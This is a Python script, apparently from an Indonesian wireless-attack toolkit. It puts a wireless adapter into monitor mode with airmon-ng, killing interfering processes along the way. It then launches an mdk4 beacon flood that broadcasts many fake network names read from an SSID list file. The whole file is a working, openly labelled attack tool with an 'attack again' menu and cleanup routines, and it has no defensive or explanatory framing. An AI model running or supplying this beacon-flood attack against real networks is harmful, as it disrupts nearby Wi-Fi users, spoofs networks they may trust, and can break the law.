#!/usr/bin/env python3
import csv
import glob
import os
import random
import re
import subprocess
import sys
import tempfile
import time
import signal

GREEN = "\033[92m"
RED = "\033[91m"
CYAN = "\033[96m"
MAGENTA = "\033[95m"
YELLOW = "\033[93m"
RESET = "\033[0m"
BOLD = "\033[1m"


def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')


def get_wireless_interfaces():
    output = subprocess.run(["ip", "link"], capture_output=True, text=True).stdout
    interfaces = []
    for line in output.splitlines():
        m = re.match(r"^\d+:\s+(\S+):", line)
        if m:
            name = m.group(1)
            if name == "lo":
                continue
            interfaces.append(name)
    return interfaces


def get_monitor_interface_name(adapter, output):
    current_ifaces = get_wireless_interfaces()
    for iface in current_ifaces:
        if iface != adapter and iface.endswith("mon"):
            return iface

    match = re.search(r"\[(?:phy\d+)\]([A-Za-z0-9_.:-]+mon)\b", output, re.IGNORECASE)
    if match:
        return match.group(1)

    match = re.search(r"\b([A-Za-z0-9_.:-]+mon)\b", output, re.IGNORECASE)
    if match:
        return match.group(1)

    try:
        iw_output = subprocess.run(["iw", "dev"], capture_output=True, text=True).stdout
        for line in iw_output.splitlines():
            m = re.search(r"\bInterface\s+(\S+)", line)
            if m:
                iface = m.group(1)
                if iface != adapter and iface.endswith("mon"):
                    return iface
    except FileNotFoundError:
        pass

    return f"{adapter}mon"


def run_command(cmd, description=None, show_output=True):
    if description:
        print(f"\n{CYAN}>{description}{RESET}")

    if show_output:
        print(f"{YELLOW}{' '.join(cmd)}{RESET}")

    result = subprocess.run(cmd, capture_output=True, text=True)
    if show_output:
        if result.stdout:
            print(result.stdout.strip())
        if result.stderr:
            print(result.stderr.strip())

    if result.returncode != 0:
        print(f"{RED}Perintah gagal: {' '.join(cmd)}{RESET}")
        return None
    return result


def start_monitor_mode(adapter):
    print(f"\n{CYAN}ACTIVATING MONITOR MODE ON {adapter}...{RESET}")
    run_command(["sudo", "airmon-ng", "check", "kill"], "MEMBERSIHKAN PROSES PENGANGGU", show_output=False)
    result = run_command(["sudo", "airmon-ng", "start", adapter], "MONITOR MODE AKTIF", show_output=False)
    print("")
    if result is None:
        return adapter

    output = (result.stdout or "") + (result.stderr or "")
    monitor_iface = get_monitor_interface_name(adapter, output)
    time.sleep(1)
    print(f"> Interface monitor aktif: {monitor_iface}")
    print()
    return monitor_iface


def stop_monitor_mode(monitor_iface):
    print(f"\n{CYAN}STOPPING MONITOR MODE...{RESET}")
    candidates = [monitor_iface]
    if monitor_iface.endswith("mon"):
        candidates.append(monitor_iface[:-3])
    else:
        candidates.append(f"{monitor_iface}mon")

    for name in candidates:
        result = run_command(["sudo", "airmon-ng", "stop", name], "MEMATIKAN MONITOR MODE", show_output=False)
        if result is not None:
            break

    print(f"{CYAN}RESTARTING NETWORKMANAGER...{RESET}")
    run_command(["sudo", "systemctl", "restart", "NetworkManager"], show_output=False)
    run_command(["sudo", "systemctl", "restart", "wpa_supplicant"], show_output=False)
    print(f"{GREEN}NetworkManager dan wpa_supplicant berhasil direstart{RESET}")


def select_interface():
    print(f"\n{CYAN}SCANNING INTERFACES...{RESET}")
    ifaces = get_wireless_interfaces()
    if not ifaces:
        print("Ga ada interface ditemukan.")
        sys.exit(1)

    print(f"\n{BOLD}Pilih interface:{RESET}")
    for idx, name in enumerate(ifaces, start=1):
        print(f"{GREEN}{idx}.{RESET} {name}")

    while True:
        choice = input("\nNomor: ").strip()
        if choice.isdigit() and 1 <= int(choice) <= len(ifaces):
            selected = ifaces[int(choice) - 1]
            print(f"{GREEN}LOCKED: {selected}{RESET}")
            clear_screen()
            return selected
        print("Input salah, coba lagi.")


def get_ssid_file_path():
    """Mencari file ssid_list.txt di folder ssid-fake"""
    script_dir = os.path.dirname(os.path.abspath(__file__))
    
    # Coba cari di folder ssid-fake di direktori yang sama dengan script
    possible_paths = [
        os.path.join(script_dir, "ssid-fake", "ssid_list.txt"),
        os.path.join(script_dir, "ssid_list.txt"),
        os.path.join(os.path.dirname(script_dir), "ssid-fake", "ssid_list.txt"),
    ]
    
    for path in possible_paths:
        if os.path.exists(path):
            return path
    
    print(f"{RED}File ssid_list.txt tidak ditemukan!{RESET}")
    print(f"{YELLOW}Pastikan file ada di: ssid-fake/ssid_list.txt{RESET}")
    return None


def show_post_attack_menu(monitor_iface):
    """Menampilkan menu setelah serangan dihentikan"""
    print(f"\n{BOLD}{CYAN}╔══════════════════════════════════════════════════╗{RESET}")
    print(f"{BOLD}{CYAN}║              SERANGAN DIHENTIKAN                 ║{RESET}")
    print(f"{BOLD}{CYAN}╚══════════════════════════════════════════════════╝{RESET}")
    print(f"\n{BOLD}1.{RESET} Attack Again")
    print(f"{BOLD}0.{RESET} Back to Menu (mdk4-menu.py)")
    print(f"{BOLD}99.{RESET} Exit")
    
    while True:
        try:
            choice = input(f"\n{BOLD}{YELLOW}>> Pilihan: {RESET}").strip()
            
            if choice == "1":
                # Attack again - cleanup dulu lalu restart
                print(f"\n{GREEN}Memulai ulang serangan...{RESET}")
                stop_monitor_mode(monitor_iface)
                time.sleep(1)
                # Jalankan ulang script ini
                os.execvp(sys.executable, [sys.executable, __file__])
                
            elif choice == "0":
                # Back to menu - cleanup dan jalankan mdk4-menu.py
                print(f"\n{GREEN}Kembali ke menu utama...{RESET}")
                stop_monitor_mode(monitor_iface)
                time.sleep(1)
                
                # Cari mdk4-menu.py
                script_dir = os.path.dirname(os.path.abspath(__file__))
                menu_path = os.path.join(script_dir, "mdk4-menu.py")
                
                if os.path.exists(menu_path):
                    os.execvp(sys.executable, [sys.executable, menu_path])
                else:
                    print(f"{RED}mdk4-menu.py tidak ditemukan!{RESET}")
                    sys.exit(0)
                    
            elif choice == "99":
                # Exit - cleanup dan keluar
                print(f"\n{GREEN}Keluar dari program...{RESET}")
                stop_monitor_mode(monitor_iface)
                time.sleep(1)
                print(f"{GREEN}Terima kasih!{RESET}")
                sys.exit(0)
                
            else:
                print(f"{RED}Pilihan tidak valid! Silakan pilih 1, 0, atau 99.{RESET}")
                
        except KeyboardInterrupt:
            print(f"\n{YELLOW}Interrupt diterima, keluar...{RESET}")
            stop_monitor_mode(monitor_iface)
            sys.exit(0)


def run_beacon_attack(monitor_iface):
    ssid_file = get_ssid_file_path()
    if not ssid_file:
        print(f"{RED}Gagal menemukan ssid_list.txt. Serangan dibatalkan.{RESET}")
        return

    mdk4_cmd = [
        "sudo",
        "mdk4",
        monitor_iface,
        "b",
        "-f",
        ssid_file,
        "-w",
        "a",
        "-m",
        "-s",
        "500",
    ]

    print(f"\n{YELLOW}Menjalankan mdk4 beacon flood (mode b)...{RESET}")
    print(f"{YELLOW}Menggunakan SSID dari: {ssid_file}{RESET}")
    print(f"{YELLOW}{' '.join(mdk4_cmd)}{RESET}")
    print(f"\n{BOLD}{GREEN}[!] Tekan Ctrl+C untuk menghentikan serangan{RESET}\n")

    try:
        result = subprocess.run(mdk4_cmd)
        if result.returncode != 0 and result.returncode != -2:  # -2 biasanya dari SIGINT
            print(f"{RED}MDK4 beacon attack gagal dengan kode keluar {result.returncode}.{RESET}")
            # Tampilkan menu setelah error
            show_post_attack_menu(monitor_iface)
    except KeyboardInterrupt:
        # Tangkap Ctrl+C dan tampilkan menu
        print(f"\n\n{YELLOW}Serangan dihentikan oleh pengguna.{RESET}")
        show_post_attack_menu(monitor_iface)


def main():
    monitor_iface = None
    
    # Setup signal handler untuk cleanup
    def signal_handler(sig, frame):
        print(f"\n{YELLOW}Signal received, cleaning up...{RESET}")
        if monitor_iface:
            stop_monitor_mode(monitor_iface)
        sys.exit(0)
    
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)

    try:
        adapter = select_interface()
        monitor_iface = start_monitor_mode(adapter)
        
        # Jalankan serangan
        run_beacon_attack(monitor_iface)
        
        # Cleanup setelah serangan selesai normal
        print("\nMembersihkan sesi...")
        stop_monitor_mode(monitor_iface)
        
    except KeyboardInterrupt:
        print(f"\n{YELLOW}Keyboard interrupt diterima.{RESET}")
        if monitor_iface:
            stop_monitor_mode(monitor_iface)
        print("Keluar dari program.")
        sys.exit(0)
    except Exception as e:
        print(f"{RED}Error: {e}{RESET}")
        if monitor_iface:
            stop_monitor_mode(monitor_iface)
        sys.exit(1)


if __name__ == "__main__":
    main()